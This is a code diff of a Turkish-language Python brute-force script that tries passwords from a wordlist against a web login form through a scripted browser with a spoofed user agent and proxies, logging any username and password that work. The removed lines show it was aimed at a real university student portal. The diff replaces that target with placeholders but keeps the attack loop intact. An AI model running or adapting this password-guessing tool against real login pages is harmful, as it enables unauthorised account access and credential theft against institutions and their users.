@@ -18,7 +18,6 @@ import io
 # Dosya işlemleri için kullandığımız kütüphane
 
 print("\n ）︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶（")
-print(f" ）          {Back.RED}ISTINYE UNIVERSITESI{Back.RESET}          （")
 print(" ）----------------------------------------（")
 print(" ）           Brute-Force Attack           （")
 print(" ）           ------------------           （")
@@ -43,7 +42,7 @@ b.addheaders = [('User-agent',
                  )]
 # Browser kimliğini tanımlıyoruz -> useragentstring.com
 
-print("[A] myISU")
+print("[A] LINK")
 print("[B] ECZANE DB")
 secim = input("SECIM    = ")
 print("-------------------------------------------------\n")
@@ -69,7 +68,7 @@ def proxy():
         return proxy()
 
 
-def bruteforceMyISU():
+def bruteforce1():
     sifre = open(sifreDosyasi).read().splitlines()
     try_login = 0
     print(f"{Back.YELLOW}{Fore.BLACK}!! ATAK BASLADI !!{Fore.RESET}{Back.RESET}\n")
@@ -79,7 +78,7 @@ def bruteforceMyISU():
             try_login = 0
         sys.stdout.write('\r[-] {} [-] '.format(sifre))
         sys.stdout.flush()
-        adres = "https://myisu.istinye.edu.tr/tr/user/login?destination="
+        adres = "link"
         try:
             b.open(adres, timeout=10)
             b.select_form(nr=0)
@@ -88,9 +87,9 @@ def bruteforceMyISU():
             b.method = "POST"
             submit = b.submit()
 
-            if submit.geturl() == "https://myisu.istinye.edu.tr/":
+            if submit.geturl() == "link":
                 print(f"{Back.GREEN}SIFRE BULUNDU = "+sifre+f"{Back.RESET}")
-                kaydet = io.open("myISU.txt", "a").write("Kullanıcı Adı:" + kullaniciadi + "\t\tSifre:" + sifre + "\n")
+                kaydet = io.open("1.txt", "a").write("Kullanıcı Adı:" + kullaniciadi + "\t\tSifre:" + sifre + "\n")
                 break
             else:
                 print(f"{Back.RED}ESLESMEDI{Back.RESET}\n")
@@ -131,7 +130,7 @@ def db():
 
 if __name__ == '__main__':
     if secim == "a" or secim == "A":
-        bruteforceMyISU()
+        bruteforce1()
         proxy()
     elif secim == "b" or secim == "B":
         db()
